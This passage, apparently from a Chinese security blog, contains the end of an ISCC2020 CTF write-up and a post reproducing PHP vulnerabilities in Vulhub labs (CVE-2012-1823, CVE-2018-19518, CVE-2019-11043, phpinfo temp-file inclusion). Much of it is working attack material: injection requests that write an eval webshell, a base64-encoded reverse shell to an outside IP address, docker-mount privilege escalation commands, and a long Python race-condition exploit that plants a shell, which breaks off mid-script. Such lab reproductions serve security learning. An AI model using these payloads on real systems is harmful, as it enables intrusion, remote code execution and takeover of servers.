class="comment">//后缀名必须为 phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass;</span><br><span class="line">$phar-&gt;setMetadata($object); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进去之后发现flag在/root/flag.txt,反弹shell,docker提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull alpine</span><br><span class="line">docker docker run -id -v /:/tmp alpine</span><br><span class="line">docker <span class="built_in">exec</span> 68335e7b38e0 cat /tmp/root/flag.txt</span><br></pre></td></tr></table></figure><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200524230551.png" style="zoom:80%;"><h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><h4 id="是我DIO哒"><a href="#是我DIO哒" class="headerlink" title="是我DIO哒"></a>是我DIO哒</h4><p>foremost分离出一张二维码，不知道binwalk为啥不行，扫出来是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Useful_Massage_1(SVNDQyU3QmZsQGdfaXN</span><br></pre></td></tr></table></figure><p>StegSolve分离出第二部分</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200507153230.png" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Useful_M assage_2(fa09fTjBfRCUyMW9fZGFhYW ElMjFfXyU3RA&#x3D;&#x3D;)</span><br></pre></td></tr></table></figure><p>拼接到一块，base64解密并url解码得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;fl@g_is_kO_N0_D!o_daaaa!__&#125;</span><br></pre></td></tr></table></figure><h4 id="Easy-Minecraft"><a href="#Easy-Minecraft" class="headerlink" title="Easy_Minecraft"></a>Easy_Minecraft</h4><p>下载对应的版本的mc，添加服务器发现：</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200512130457.png" style="zoom: 67%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key2:Decode(n*Base64_Decode(VlRKR2MyUkhWbXRZTVNzNVRWVkp0VFl3YVdoUmRFNXBNelozYkVKWVJWbE9Za1pKUVV4b00wdDJRU1V6UkElM0QlM0Q%3D))</span><br></pre></td></tr></table></figure><p>base64解密一次为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VTJGc2RHVmtYMSs5TVVJtTYwaWhRdE5pMzZ3bEJYRVlOYkZJQUxoM0t2QSUzRA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>再解密一次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+9MUIµ60ihQtNi36wlBXEYNbFIALh3KvA&#x3D;</span><br></pre></td></tr></table></figure><p>直接加入服务器会提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tJNV90aDFzX2ZsQGc&#x2F;fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64解密之后是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;I5_th1s_fl@g?&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ISCC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhub之php</title>
      <link href="2020/05/05/Vulhub%E4%B9%8Bphp/"/>
      <url>2020/05/05/Vulhub%E4%B9%8Bphp/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要复现了Vulhub上的php部分漏洞！</p><a id="more"></a><h2 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞可导致代码执行。</p><p>WEB 中，</p><ul><li><p><strong>Web Server 一般指Apache、Nginx、IIS、Lighttpd、Tomcat等服务器</strong></p></li><li><p><strong>Web Application 一般指PHP、Java、Asp.net等应用程序</strong></p></li><li><p><strong>cgi： Web Server 与 Web Application 之间数据交换的一种协议</strong></p></li><li><p><strong>FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。同样，SCGI 协议与 FastCGI 类似</strong></p></li><li><p><strong>PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序</strong></p></li><li><p><strong>PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理</strong></p></li></ul><p>在整个网站架构中，Web Server（如Apache）只是内容的分发者。如果客户端请求的是 <code>index.html</code>，那么Web Server会去文件系统中找到这个文件，发送给浏览器，下图分发的是静态数据。</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/html.png" style="zoom:80%;"><p>如果请求的是 index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/cgi.png" style="zoom:80%;"><p>当Web Server收到 index.php 这个请求后，会启动对应的 CGI 程序，这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p><p>更详细的内容参考：</p><p><a href="https://www.cnblogs.com/zzx-hjl/p/10583849.html">https://www.cnblogs.com/zzx-hjl/p/10583849.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>本漏洞只出现在以cgi模式运行的php中，影响版本 <code>php &lt; 5.3.12 or php &lt; 5.4.2</code>。</p><p>这个漏洞简单来说，就是用户请求的querystring被作为了php-cgi的参数，最终导致了一系列结果。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接访问一个php文件加上<code>-s</code>就能看到源码</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200505214143.png" style="zoom:80%;"><p>除了<code>-s</code>还有以下参数可用：</p><ul><li><code>-c</code> 指定php.ini文件的位置</li><li><code>-n</code> 不要加载php.ini文件</li><li><code>-d</code> 指定配置项</li><li><code>-b</code> 启动fastcgi进程</li><li><code>-T</code> 执行指定次该文件</li><li><code>-h</code>和<code>-?</code> 显示帮助</li></ul><p>我们可以构造下面的请求来执行代码：</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200505214846.png" style="zoom:80%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">/index.php?-d+allow_url_include%<span class="number">3</span>don+-d+auto_prepend_file%<span class="number">3</span>dphp%<span class="number">3</span>a<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br></pre></td></tr></table></figure><p>这个漏洞被爆出来以后，PHP官方对其进行了修补，发布了新版本5.4.2及5.3.12，但这个修复是不完全的，可以被绕过，进而衍生出CVE-2012-2311漏洞，此时我们可以空格+<code>-</code>绕过。</p><h2 id="CVE-2018-19518"><a href="#CVE-2018-19518" class="headerlink" title="CVE-2018-19518"></a>CVE-2018-19518</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞可导致命令执行。</p><p>php imap扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。</p><p>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞环境关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">    $imap = @imap_open(<span class="string">&#x27;&#123;&#x27;</span>.$_POST[<span class="string">&#x27;hostname&#x27;</span>].<span class="string">&#x27;:993/imap/ssl&#125;INBOX&#x27;</span>, $_POST[<span class="string">&#x27;username&#x27;</span>], $_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>该命令执行是无回显的，因此我们可以尝试着写马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">hostname=x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%<span class="number">2</span>BJz5tb29uYmFjay5waHA%<span class="number">3</span>D|base64%<span class="number">09</span>-d|sh&#125;&amp;username=<span class="number">111</span>&amp;password=<span class="number">222</span></span><br></pre></td></tr></table></figure><p>其中base64编码是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&gt;moonback.php</span><br></pre></td></tr></table></figure><p>或者不用这样麻烦，直接加上<code>;</code>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">hostname=x+-oProxyCommand%3d;ls&gt;a&#125;&amp;username=111&amp;password=222</span><br></pre></td></tr></table></figure><p>反弹shell:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">hostname=x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>YmFzaCAtaSA%<span class="number">2</span>BJiAvZGV2L3RjcC80Ny45Ny4yMTAuMTQxLzkwMDAgMD4mMQ%<span class="number">3</span>D%<span class="number">3</span>D|base64%<span class="number">09</span>-d|bash&#125;&amp;username=<span class="number">111</span>&amp;password=<span class="number">222</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2019-11043"><a href="#CVE-2019-11043" class="headerlink" title="CVE-2019-11043"></a>CVE-2019-11043</h2><h3 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。</p><p>在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。</p><p><strong>利用条件和影响范围：</strong></p><p>利用条件以及漏洞影响范围。</p><p>1、Nginx + php_fpm，且配置<code>location ~ [^/]\.php(/|$)</code>会将请求转发到php-fpm。<br>2、Nginx配置<code>fastcgi_split_path_info</code>并且以<code>^</code>开始以<code>$</code>，只有在这种条件下才可以通过换行符来打断正则表达式判断。 ps: 则允许<code>index.php/321 -&gt; index.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_split_path_info ^(.+?\.php)(&#x2F;.*)$;</span><br></pre></td></tr></table></figure><p>3、<code>fastcgi_param</code>中<code>PATH_INFO</code>会被定义通过<code>fastcgi_param PATH_INFO $fastcgi_path_info;</code>，当然这个变量会在<code>fastcgi_params</code>默认定义。<br>4、在nginx层面没有定义对文件的检查比如<code>try_files $uri =404</code>，如果nginx层面做了文件检查，则请求不会被转发给php-fmp。</p><p>nginx配置类似于：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">server_name</span> _;</span><br><span class="line"><span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</span><br><span class="line"><span class="comment">#try_files $uri =404;</span></span><br><span class="line"><span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line"><span class="attribute">fastcgi_pass</span> <span class="number">172.16.88.3:9000</span>;</span><br><span class="line"><span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line"><span class="attribute">include</span> fastcgi_params;</span><br><span class="line"><span class="attribute">fastcgi_param</span> SCRIPT_FILENAME /var/www/html<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line"><span class="attribute">fastcgi_param</span> PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"><span class="attribute">fastcgi_hide_header</span> X-Powered-By;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个漏洞在实际研究过程中对真实世界危害有限，其主要原因都在于大部分的nginx配置中都携带了对文件的检查，且默认的nginx配置不包含这个问题</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>exp github地址：<a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a></p><p>ubuntu安装go环境，直接用apt安装的是1.6版本，该脚本要求1.13及以上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:longsleep/golang-backports</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install golang-go</span><br></pre></td></tr></table></figure><p>默认项目文件夹是<code>~/go</code>，接着就</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/neex/phuip-fpizdam</span><br></pre></td></tr></table></figure><p>在<code>~/go/bin</code>下面就能看到编译成功的二进制文件了，跑exp:</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506102252.png" style="zoom:80%;"><p>然后就可以命令执行了</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506102412.png" style="zoom:80%;"><h2 id="利用phpinfo包含临时文件"><a href="#利用phpinfo包含临时文件" class="headerlink" title="利用phpinfo包含临时文件"></a>利用phpinfo包含临时文件</h2><h3 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞需要有包含点，并且有phpinfo页面，然后就能getshell，该漏洞与php版本无关</p><p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是<code>/tmp/php[6个随机字符]</code>），文件名可以在<code>$_FILES</code>变量中找到。这个临时文件，在请求结束后就会被删除。</p><p>同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，自然也包含临时文件名。</p><p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p><p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p><p>这个时候就需要用到条件竞争，具体流程如下：</p><ol><li>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</li><li>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</li><li>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</li><li>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li><li>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</li><li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</li></ol><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>python2 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>(<span class="params">host, port</span>):</span></span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;&quot;%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s&quot;&quot;&quot;</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script</span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, e, l, m, *args</span>):</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">&quot;\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class="line">                    self.event.set()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">&quot;0\r\n\r\n&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in 